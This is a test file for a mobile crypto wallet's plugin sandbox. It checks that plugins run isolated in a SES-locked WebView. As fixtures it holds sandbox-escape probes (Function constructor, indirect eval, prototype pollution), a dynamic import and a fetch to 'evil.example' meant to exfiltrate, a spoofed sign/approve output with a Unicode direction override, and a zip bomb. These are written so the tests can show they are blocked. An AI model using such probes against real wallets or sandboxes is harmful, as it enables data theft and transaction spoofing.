/**
 * Clip Plugins end to end without a simulator: the REAL generated sandbox page (SES lockdown + Compartment +
 * runtime, sandbox.generated.ts) runs in its own JavaScript realm (a happy-dom window, standing in for the
 * WebView's page) and talks to the REAL app side (createMobilePlugins → PluginHost → channels.ts → protocol.ts)
 * only through strings, the way react-native-webview delivers them:
 *   app → page   window.dispatchEvent(new MessageEvent("message", { data })) (iOS) / document.dispatchEvent (Android)
 *   page → app   window.ReactNativeWebView.postMessage(string) → onMessage({ data, url: "about:blank" })
 * Ports packages/plugins/test/isolation.test.ts to that path. What only a device can show (WKWebView / Android
 * WebView process isolation, the CSP actually enforced, a plugin stuck in a loop) is listed in
 * docs/phase25/integration/mobile-parity.md.
 */
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { gzipSync } from "node:zlib";
import { Window as HappyWindow } from "happy-dom";
import { MemoryKV } from "@clip-wallet/engine";
import { InstallError, PLUGIN_KEYS, type InsightInput } from "@clip-wallet/plugins";
import { PLUGIN_SANDBOX_JS } from "../src/plugins/sandbox.generated";
import { createWebViewChannels } from "../src/plugins/channels";
import { SANDBOX_URL } from "../src/plugins/protocol";
import { createMobilePlugins } from "../src/plugins/host";
import { gunzipCapped } from "../src/plugins/gunzip";
import { LABEL_SOURCE, fakeRegistry, manifest, pluginTarball } from "./plugin-fixtures";

const wait = (ms = 0) => new Promise((r) => setTimeout(r, ms));
async function until<T>(f: () => T | undefined | false, ms = 3000): Promise<T> {
  const end = Date.now() + ms;
  for (;;) {
    const v = f();
    if (v) return v;
    if (Date.now() > end) throw new Error("timed out");
    await wait(5);
  }
}

const INPUT: InsightInput = {
  origin: "https://dapp.example",
  title: "Send 1 ETH to 0x0000…dEaD",
  lines: [{ label: "To", value: "0x000000000000000000000000000000000000dEaD" }],
  balanceChanges: [{ asset: "ETH", delta: "-1000000000000000000" }],
  networkId: "evm:84532",
  account: "0x9858EfFD232B4033E47d90003D41EC34EcaEda94",
};

/** One "WebView": a fresh realm running the real sandbox page, wired like react-native-webview. */
function mountPage(onPost: (data: string) => void, androidStyle: boolean) {
  const win = new HappyWindow({ url: SANDBOX_URL, settings: { disableJavaScriptEvaluation: false } }) as unknown as Window & { eval(js: string): unknown; ReactNativeWebView?: unknown };
  // happy-dom installs Node's own TextEncoder/TextDecoder in the page realm; SES (rightly) refuses foreign
  // intrinsics. A real WebView has its own. Nothing else is changed.
  win.eval("delete globalThis.TextEncoder; delete globalThis.TextDecoder;");
  win.ReactNativeWebView = { postMessage: (s: string) => setTimeout(() => onPost(String(s)), 0) };
  win.eval(PLUGIN_SANDBOX_JS);
  let alive = true;
  return {
    win,
    deliver(data: string) {
      setTimeout(() => {
        if (!alive) return;
        const ev = new (win as unknown as { MessageEvent: typeof MessageEvent }).MessageEvent("message", { data });
        if (androidStyle) win.document.dispatchEvent(ev);
        else win.dispatchEvent(ev);
      }, 0);
    },
    unmount() {
      alive = false;
    },
  };
}

function setup(opts: { npm?: typeof fetch; hostFetch?: typeof fetch; android?: boolean; callTimeoutMs?: number } = {}) {
  const kv = new MemoryKV();
  let advanced = false;
  const channels = createWebViewChannels();
  const pages = new Map<string, ReturnType<typeof mountPage>>();
  // What PluginSandboxes.tsx does: one page per frame; gone frames unmount.
  channels.subscribe(() => {
    const keys = new Set(channels.frames().map((f) => f.key));
    for (const [k, p] of pages) if (!keys.has(k)) (p.unmount(), pages.delete(k));
    for (const k of keys) {
      if (pages.has(k)) continue;
      const page = mountPage((data) => channels.receive(k, data, SANDBOX_URL), !!opts.android);
      pages.set(k, page);
      channels.attach(k, (d) => page.deliver(d));
    }
  });
  const fetchCalls: string[] = [];
  const hostFetch =
    opts.hostFetch ??
    ((async (url: string) => {
      fetchCalls.push(url);
      return new Response(JSON.stringify({ label: "Exchange hot wallet" }), { status: 200 });
    }) as unknown as typeof fetch);
  const npmOrHost = (async (input: RequestInfo | URL, init?: RequestInit) =>
    String(input).startsWith("https://registry.npmjs.org/") && opts.npm ? opts.npm(input, init) : hostFetch(input, init)) as typeof fetch;
  const plugins = createMobilePlugins({ kv, advanced: async () => advanced, channels: channels.factory, fetch: npmOrHost, gunzip: gunzipCapped, callTimeoutMs: opts.callTimeoutMs ?? 1500 });
  return {
    kv,
    plugins,
    channels,
    pages,
    fetchCalls,
    setAdvanced: async (v: boolean) => {
      advanced = v;
      await plugins.sync();
    },
  };
}

/** Puts a plugin straight into storage (install is tested separately). */
async function store(kv: MemoryKV, source: string, permissions: Record<string, unknown>, id = "clip-plugin-test", name = "Test plugin") {
  const prev = (await kv.get<{ enabled: boolean; plugins: unknown[] }>(PLUGIN_KEYS.state)) ?? { enabled: true, plugins: [] };
  const m = manifest(source, permissions, name);
  await kv.set(PLUGIN_KEYS.state, { enabled: true, plugins: [...prev.plugins, { id, version: "1.0.0", manifest: m, source, integrity: "sha512-x", installedAt: 0, enabled: true }] });
}

describe("install from npm on the phone (noble hashes, pako gunzip, nothing runs)", () => {
  it("verifies, prompts, and only runs after Advanced mode + the switch", async () => {
    const tarball = pluginTarball("clip-plugin-address-label");
    const reg = fakeRegistry("clip-plugin-address-label", "1.0.0", tarball);
    const s = setup({ npm: reg.f });
    await expect(s.plugins.service.handle({ type: "pluginsPrepareInstall", name: "clip-plugin-address-label" })).rejects.toMatchObject({ code: "plugins/advanced-only" });
    await s.setAdvanced(true);
    const pending = (await s.plugins.service.handle({ type: "pluginsPrepareInstall", name: "clip-plugin-address-label" })) as { id: string; version: string; permissions: string[] };
    expect(pending.permissions.join(" ")).toMatch(/add notes/);
    expect(s.channels.frames()).toEqual([]);
    await s.plugins.service.handle({ type: "pluginsConfirmInstall", id: pending.id, version: pending.version });
    await s.plugins.sync();
    expect(s.channels.frames()).toEqual([]); // the Plugins switch is still off
    await s.plugins.service.handle({ type: "pluginsSetEnabled", enabled: true });
    await until(() => s.plugins.host.isRunning("clip-plugin-address-label"));
    expect(s.channels.frames().map((f) => f.pluginId)).toEqual(["clip-plugin-address-label"]);
    const notes = await s.plugins.insights(INPUT);
    expect(notes).toEqual([
      {
        pluginId: "clip-plugin-address-label",
        pluginName: "Address labels",
        from: "from Address labels",
        lines: [{ label: "Address", value: "Burn address" }],
        warnings: [{ level: "danger", message: "Anything sent to the burn address is gone for good." }],
      },
    ]);
    // Advanced mode off stops everything: the WebView unmounts.
    await s.setAdvanced(false);
    expect(s.channels.frames()).toEqual([]);
    expect(await s.plugins.insights(INPUT)).toEqual([]);
  });

  it("refuses a tarball that inflates past the cap (zip bomb) and a damaged one", () => {
    const bomb = new Uint8Array(gzipSync(new Uint8Array(25_000_000)));
    expect(() => gunzipCapped(bomb, 20_000_000)).toThrow(InstallError);
    expect(() => gunzipCapped(new Uint8Array([0x1f, 0x8b, 8, 0, 1, 2, 3]), 1000)).toThrow(InstallError);
    expect(new TextDecoder().decode(gunzipCapped(new Uint8Array(gzipSync(Buffer.from("hello"))), 1000))).toBe("hello");
  });
});

describe("isolation inside the WebView sandbox (real SES page)", () => {
  // V8 formats every realm's error stacks with the main realm's Error.prepareStackTrace (vite-node's source-map
  // hook), which can't handle call sites from a locked-down realm. Plain V8 stacks while these tests run.
  let saved: typeof Error.prepareStackTrace;
  beforeAll(() => {
    saved = Error.prepareStackTrace;
    Error.prepareStackTrace = undefined;
  });
  afterAll(() => {
    Error.prepareStackTrace = saved;
  });
  const PROBE = `module.exports.onTransaction = async ({ request }) => {
    const t = (f) => { try { return typeof f(); } catch (e) { return "x"; } };
    const names = ["window", "document", "self", "parent", "top", "fetch", "XMLHttpRequest", "WebSocket", "EventSource", "Worker",
      "localStorage", "sessionStorage", "indexedDB", "caches", "navigator", "location", "ReactNativeWebView", "webkit", "postMessage",
      "setTimeout", "setInterval", "queueMicrotask", "require", "process", "chrome", "browser", "Image", "importScripts"];
    const seen = names.filter((n) => t(() => globalThis[n]) !== "undefined");
    const viaFunction = t(() => Function("return this")().document);
    const viaCtor = t(() => (async () => {}).constructor("return this")().fetch);
    const viaEval = t(() => (0, eval)("this").location);
    let polluted = "no";
    try { Object.prototype.polluted = 1; polluted = "yes"; } catch (e) {}
    let mutated = "no";
    try { request.title = "changed"; mutated = request.title === "changed" ? "yes" : "no"; } catch (e) {}
    return { lines: [
      { label: "globals", value: seen.join(",") || "none" },
      { label: "escapes", value: [viaFunction, viaCtor, viaEval].join(",") },
      { label: "pollution", value: polluted + "," + mutated },
      { label: "date", value: t(() => Date.now()) + "," + t(() => Math.random()) + "," + t(() => new Date().getTime()) },
    ] };
  };`;

  for (const android of [false, true]) {
    it(`a plugin sees no window, network, storage, timers or the bridge (${android ? "Android" : "iOS"} delivery)`, async () => {
      const s = setup({ android });
      await store(s.kv, PROBE, { transactionInsight: true });
      await s.setAdvanced(true);
      const [n] = await s.plugins.insights(INPUT);
      const v = Object.fromEntries(n!.lines.map((l) => [l.label, l.value]));
      expect(v.globals).toBe("none");
      // Function / AsyncFunction constructor / indirect eval reach no host global ("x" = threw, which is fine too).
      for (const e of v.escapes!.split(",")) expect(["undefined", "x"]).toContain(e);
      expect(v.pollution).toBe("no,no");
      // SES: no ambient time (Date.now() and new Date() throw) or randomness (Math.random() throws) in a compartment.
      expect(v.date).toBe("x,x,x");
      // The page dropped the bridge global; the page realm itself is locked down.
      const page = [...s.pages.values()][0]!;
      expect((page.win as unknown as { ReactNativeWebView?: unknown }).ReactNativeWebView).toBeUndefined();
      expect(page.win.eval("Object.isFrozen(Array.prototype)")).toBe(true);
    });
  }

  it("a bundle with a dynamic import() is refused when it loads", async () => {
    const s = setup();
    await store(s.kv, `module.exports.onTransaction = async () => { await import("https://evil.example/x.js"); return {}; };`, { transactionInsight: true });
    await s.setAdvanced(true);
    expect(s.plugins.host.isRunning("clip-plugin-test")).toBe(false);
    expect(s.channels.frames()).toEqual([]);
  });

  it("only granted handlers are called, and network goes only to declared origins, through the app", async () => {
    const NAMES = `module.exports.onNameLookup = async ({ name }) => ({ address: "0x000000000000000000000000000000000000dEaD", family: "evm" });
      module.exports.onTransaction = async () => {
        const a = await clip.fetch("https://api.example.com/label?a=1");
        const b = await clip.fetch("https://evil.example/steal");
        const c = await clip.fetch("http://api.example.com/plain");
        return { lines: [{ label: "fetch", value: [a.status, b.status, c.status, JSON.parse(a.body).label].join(",") }] };
      };`;
    const s = setup();
    await store(s.kv, NAMES, { transactionInsight: true, network: ["https://api.example.com"] });
    await s.setAdvanced(true);
    // nameResolution wasn't granted: never asked, no suffixes claimed.
    expect(s.plugins.suffixes()).toEqual([]);
    expect(await s.plugins.resolveName("anything.label")).toBeNull();
    const [n] = await s.plugins.insights(INPUT);
    expect(n!.lines).toEqual([{ label: "fetch", value: "200,0,0,Exchange hot wallet" }]);
    expect(s.fetchCalls).toEqual(["https://api.example.com/label?a=1"]);
    expect(n!.from).toBe("from Test plugin");
  });

  it("a plugin can't sign, see keys or reach the wallet: its output is schema-checked and labelled", async () => {
    const SNEAKY = `module.exports.onTransaction = async () => ({ lines: [{ label: "Approve", value: "ok\\u202E" }], sign: true, approve: true });`;
    const s = setup();
    await store(s.kv, SNEAKY, { transactionInsight: true });
    await s.setAdvanced(true);
    expect(await s.plugins.insights(INPUT)).toEqual([]);
  });

  it("a bundle changed in storage after install is refused before it runs", async () => {
    const s = setup();
    await store(s.kv, LABEL_SOURCE, { transactionInsight: true });
    const st = (await s.kv.get<{ enabled: boolean; plugins: { source: string }[] }>(PLUGIN_KEYS.state))!;
    st.plugins[0]!.source += "\n/* tampered */";
    await s.kv.set(PLUGIN_KEYS.state, st);
    await s.setAdvanced(true);
    expect(s.plugins.host.isRunning("clip-plugin-test")).toBe(false);
    expect(s.channels.frames()).toEqual([]);
  });

  it("a plugin that stops answering is stopped and its WebView unmounted", async () => {
    const HANG = `module.exports.onTransaction = () => new Promise(() => {});`;
    const s = setup({ callTimeoutMs: 100 });
    await store(s.kv, HANG, { transactionInsight: true });
    await s.setAdvanced(true);
    expect(s.channels.frames()).toHaveLength(1);
    expect(await s.plugins.insights(INPUT)).toEqual([]);
    expect(await s.plugins.insights(INPUT)).toEqual([]);
    expect(s.plugins.host.isRunning("clip-plugin-test")).toBe(false);
    expect(s.channels.frames()).toEqual([]);
  });
});
